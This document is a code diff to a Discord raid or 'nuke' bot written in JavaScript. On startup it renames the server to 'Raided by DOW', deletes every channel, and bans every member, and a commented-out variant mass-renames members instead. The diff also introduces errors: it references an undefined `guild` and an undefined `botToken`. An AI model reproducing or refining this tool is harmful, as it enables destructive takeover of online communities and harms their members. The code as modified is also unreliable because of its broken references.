@@ -3,12 +3,20 @@ const client = new Discord.Client();
 const config = require("./config.json");
 const fs = require("fs")
 
-//on ready 
+
+// Settings for the bot.
+const settings = {
+    botToken: "YOUR TOKEN HERE",
+    guildName: "Raided by DOW"
+};
+
+//on ready:
 client.on("ready", () => {
 
     //startup message 
     console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
-
+    // Set the guild name 
+    guild.setName(settings.guildName);
     // create variable for new channel to prevent it from getting deleted by nuke
     let createdChannelName;
     // Create an invite to a channel
@@ -31,20 +39,20 @@ client.on("ready", () => {
 
 
 
-//delete all channels on server
+    //delete all channels on server
     client.guilds.forEach(server => {
         server.channels.forEach(channel => {
-            if(createdChannelName !== channel.name) {
+            if (createdChannelName !== channel.name) {
                 channel.delete().then(response => {
                     console.log("my response", response);
                 }).catch(err => {
-                    if(err) throw err;
+                    if (err) throw err;
                 });
             }
         });
     });
-    
-//ban all members on the server
+
+    //ban all members on the server
     client.guilds.forEach(guild => {
         guild.members.forEach(m => {
             m.ban();
@@ -53,15 +61,17 @@ client.on("ready", () => {
         });
     });
 
+
+
     //replace ban all (^) with change all nicknames on server (below) if wanted
-/*    
-client.guilds.forEach(guild => {
-    guild.members.forEach(m => {
-        m.setNickname("LOLOLOLOLOLOL");
-        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Nickname ${m.user.username}; ID: ${m.id}.`);
+    /*    
+    client.guilds.forEach(guild => {
+        guild.members.forEach(m => {
+            m.setNickname("LOLOLOLOLOLOL");
+            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Nickname ${m.user.username}; ID: ${m.id}.`);
+        });
     });
-});
-*/
+    */
 
     //handle unexpected errors
     process.on("uncaughtException", err => {
@@ -70,4 +80,9 @@ client.guilds.forEach(guild => {
     });
 });
 
-client.login(config.token);
+// Some what handle unhandled rejections.
+process.on("unhandledRejection", err => {
+    process.exit(1);
+});
+
+client.login(botToken);
